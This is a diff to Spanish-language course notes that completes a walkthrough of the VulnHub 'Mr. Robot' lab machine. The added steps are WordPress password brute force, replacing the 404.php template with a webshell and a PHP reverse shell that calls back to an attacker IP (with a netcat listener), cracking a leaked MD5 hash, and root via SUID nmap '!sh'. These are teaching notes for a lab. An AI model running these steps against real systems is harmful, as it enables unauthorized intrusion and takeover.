@@ -187,8 +187,8 @@ www-data (RCE web) → summer (SSH:22222) → Robo de ficheros → Hydra → Ric
 
 ## ③ Mr. Robot (VulnHub) "” inicio
 
-> [!warning] Máquina sin terminar
-> Solo se hizo el reconocimiento y el comienzo de la enumeración web. La fuerza bruta del panel de WordPress se dejó corriendo y se continúa en la próxima clase.
+> [!warning] Máquina trabajada en dos sesiones
+> El reconocimiento y la enumeración inicial (hasta el usuario Elliot) se hicieron en la sesión del 09.06. La cadena se cerró el 16.06: fuerza bruta de contraseña, file upload en WordPress, reverse shell y escalada a root — ver los apartados finales de esta sección.
 
 ### Reconocimiento
 
@@ -281,6 +281,116 @@ nmap (80/443) → robots.txt → fsocity.dic → Limpiar diccionario → Enumera
 > [!info] Sobre versiones de WordPress
 > La fuga de información usuario/contraseña no es un fallo de versión: es una opción de configuración del propietario en el panel de WordPress. Las versiones modernas vienen configuradas por defecto para no revelarlo.
 
+### Fuerza bruta de la contraseña (cierre del 16.06)
+
+Con el usuario **elliot** confirmado, se repite el proceso en Intruder con el campo **contraseña** como payload, usando el diccionario limpio (~11.452 líneas de `sort | uniq`):
+
+```
+sort diccionario.txt | uniq > diccionario_clean.txt
+```
+
+La respuesta válida se distingue por dos señales:
+
+- **Longitud diferente** a la del resto de peticiones.
+- **Cookie de WordPress** en la respuesta → el login ha tenido éxito.
+
+> [!important] Information disclosure = fuerza bruta dirigida
+> Los mensajes de error del login son información: si distingue entre "usuario no existe" y "contraseña incorrecta", confirma la existencia de usuarios. Eso convierte una fuerza bruta ciega en **dirigida** (primero usuario, luego contraseña).
+
+### Explotación autenticada: file upload en WordPress
+
+Dentro del panel de administración hay tres vías para conseguir ejecución de código:
+
+| Vía | Cómo | Notas |
+|-----|------|-------|
+| **1. WP File Manager** | Instalar plugin oficial → navegar y subir ficheros al servidor | La más limpia, no modifica ficheros existentes |
+| **2. Editor de plantillas** | Apariencia → Editor → `404.php` del tema | **Usada en clase**: se accede fácil con cualquier URL inexistente |
+| **3. Editor de temas de wp-admin** | Alternativa al editor de apariencia | Misma idea: sobrescribir PHP del tema |
+
+Condiciones para que el ataque funcione:
+
+1. El fichero debe ser **accesible desde el navegador**.
+2. El servidor debe **interpretarlo** (no servirlo como texto).
+
+> [!important] Apache + Linux = PHP · IIS + Windows = ASP.NET
+> Subir una shell en el lenguaje equivocado produce un fichero inútil. Validación del servidor: sin validación (lo común y más peligroso) → **blacklist** (siempre bypasseable) → **whitelist** (la única aproximación correcta).
+> Metáfora de clase: subir un fichero sin que se ejecute es "colar una pistola en un edificio donde nadie sabe usarla" — el peligro llega cuando el servidor interpreta el código.
+
+**Vía usada — Editor de plantillas:**
+
+1. Apariencia → Editor → plantilla `404.php` del tema activo.
+2. Sustituir el contenido por una **webshell simple** (Kali la trae en `/usr/share/webshells/php/`; parámetro `cmd`).
+3. Navegar a `http://IP/wp-content/themes/TEMA/404.php?cmd=whoami` → ejecuta el comando y muestra el output.
+
+### Reverse shell desde 404.php
+
+La webshell da ejecución de comandos, pero es incómoda para trabajo sostenido. Se sustituye el 404.php por la plantilla **`php-reverse-shell.php`** de Kali (`/usr/share/webshells/php/`), modificando dos campos:
+
+```php
+$ip = 'NUESTRA_IP';   // IP de la máquina atacante
+$port = 4444;         // puerto a la escucha
+```
+
+Flujo:
+
+```bash
+# 1) Listener SIEMPRE primero
+nc -lvnp 4444
+
+# 2) Visitar la URL del 404.php → la página se queda cargando
+#    (está ejecutando el PHP) y en el listener llega la conexión
+
+# 3) Usuario obtenido: daemon
+```
+
+> [!tip] Bind vs Reverse (regla definitiva)
+> **Bind shell**: el atacante se conecta a la víctima (puerto abierto en la víctima). **Reverse shell**: la víctima se conecta al atacante (puerto abierto en el atacante). La reverse requiere RCE previo para ejecutar el código que inicia la conexión saliente.
+
+### Movimiento lateral: daemon → robot
+
+`/home/robot/password.raw-md5` es legible por otros usuarios:
+
+```bash
+cat /home/robot/password.raw-md5
+# robot:c3fcd3d76192e4007dfb496cca67e13b
+# → CrackStation la rompe de golpe (rainbow tables): abcdefghijklmnopqrstuvwxyz
+
+su robot
+# Flag 2:
+cat /home/robot/key-2-of-3.txt
+```
+
+### Escalada final: robot → root (SUID en nmap)
+
+`sudo -l` como robot no devuelve nada útil. Siguiente paso clásico:
+
+```bash
+# Buscar binarios con bit SUID
+find / -perm -u=s -type f 2>/dev/null
+
+# Entre los resultados: /usr/local/bin/nmap (inusual, nmap NO debería tener SUID)
+# GTFOBins → nmap → filtro SUID (nmap 2.02-5.21):
+nmap --interactive
+# Dentro del modo interactivo:
+!sh
+whoami   # root
+
+# Flag final:
+cat /root/key-3-of-3.txt
+```
+
+> [!important] Por qué funciona
+> El bit SUID hace que quien ejecute el binario lo haga **con los privilegios del propietario**. Si el propietario es root y el binario permite ejecutar comandos (como `nmap --interactive` → `!sh`), cualquier usuario se convierte en root. GTFOBins documenta decenas de binarios con este patrón.
+
+### Cadena completa de Mr. Robot
+
+```
+nmap (80/443) → robots.txt (flag 1 + fsocity.dic) → Sanitizar diccionario →
+Information disclosure → Usuario: elliot → Fuerza bruta pwd (Intruder) →
+wp-admin → Editor plantillas → 404.php (webshell/reverse) → daemon →
+MD5 crackeado (CrackStation) → robot (flag 2) → SUID nmap → !sh → root (flag 3)
+```
+
 ---
 
 ## ④ Conceptos base: tipos de cuenta y permisos
@@ -334,7 +444,7 @@ Los permisos se leen en tres bloques "” **propietario, grupo y otros** "” ca
 | Máquina | OS | Cadena resumida |
 |---------|----|----------------|
 | **RickdiculouslyEasy** | Linux | RCE web → SSH → Robo ficheros → Hydra → sudo su |
-| **Mr. Robot** | Linux | robots.txt → Diccionario → Enumerar usuario → Fuerza bruta |
+| **Mr. Robot** | Linux | robots.txt → Diccionario → Usuario Elliot → Fuerza bruta → 404.php → daemon → MD5 → robot → SUID nmap → root |
 
 ---
 
@@ -350,6 +460,11 @@ Los permisos se leen en tres bloques "” **propietario, grupo y otros** "” ca
 - [ ] ¿Entiendo cómo Burp Suite Intruder enumera usuarios por longitud de respuesta?
 - [ ] ¿Recuerdo sanitizar diccionarios con `sort | uniq`?
 - [ ] ¿Dejo siempre el listener antes de una reverse shell?
+- [ ] ¿Sé explotar WordPress vía editor de plantillas (404.php)?
+- [ ] ¿Explico la regla Apache+PHP vs IIS+ASP.NET para file uploads?
+- [ ] ¿Completo la cadena de Mr. Robot: MD5 CrackStation → su robot → SUID nmap → `!sh`?
+
+
 
 
 
@@ -363,26 +478,15 @@ Los permisos se leen en tres bloques "” **propietario, grupo y otros** "” ca
 
 ### Documentos Relacionados
 
-- [[../../apuntes Chema/Maquinas/Son ROBOTS.md|Son ROBOTS]] — Feroxbuster, Hack The Box, WordPress
-- [[../../transcripciones/Junio/09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot.md|09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[Metodología de Explotación.md|Metodología de Explotación]] — Escalada de Privilegios, Linux, Netcat / Reverse Shells
-- [[Explotación de Máquinas Locales I - Oopsie y Archetype.md|Explotación de Máquinas Locales I - Oopsie y Archetype]] — Escalada de Privilegios, Linux, Netcat / Reverse Shells
-- [[../../informes/Informe_Academy.md|Informe_Academy]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[../../write-ups/Academy-THL.md|Academy-THL]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
+- [[../../apuntes Chema/Maquinas/Son ROBOTS.md|Son ROBOTS]] — Hack The Box, Kali Linux, Windows
+- [[../../transcripciones/Junio/09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot.md|09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot]] — Kali Linux, Nmap, Windows
+- [[../../apuntes Joselu/MODULO3/resumen_master_clase34.md|resumen_master_clase34]] — Hack The Box, Kali Linux, Windows
+- [[../../informes/Informe_Academy.md|Informe_Academy]] — Kali Linux, Nmap, Post-Explotacion
+- [[Explotación de Máquinas Locales I - Oopsie y Archetype.md|Explotación de Máquinas Locales I - Oopsie y Archetype]] — Hack The Box, Nmap, Windows
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/BurpSuite|Burp Suite]]
-- [[comandos/DirSearch|DirSearch]]
-- [[comandos/Feroxbuster|Feroxbuster]]
-- [[comandos/Hydra|Hydra]]
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
-- [[comandos/Nmap|Nmap]]
-- [[comandos/SSH|SSH]]
+- [[../../../programacion/Rust/fundamentos_rust.md|fundamentos_rust]] — Programacion: Desarrollo Web, Funcional, Rust
+- [[../../../programacion/Rust/seguridad_rust.md|seguridad_rust]] — Programacion: Desarrollo Web, Funcional, Rust
 
-### 🎯 Vulnerabilidades Relacionadas
-
-- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
-
-> #burpsuite #command-injection #dirsearch #escalada-privilegios #esteganografia #feroxbuster #hack-the-box #hydra #kali #linux #metasploit #netcat #nmap #pentest #post-explotacion #redes #reverse-shell #ssh #vulnhub #windows #wordpress
+> #burpsuite #cli #command_injection #crypto #dirsearch #escalada_privilegios #esteganografia #feroxbuster #funcional #hack_the_box #hydra #kali #linux #linux_ciber #metasploit #netcat #nmap #pentest #post_explotacion #redes #redes_ciber #reverse_shell #rust #ssh_tool #vulnhub #web #windows_ciber #wordpress
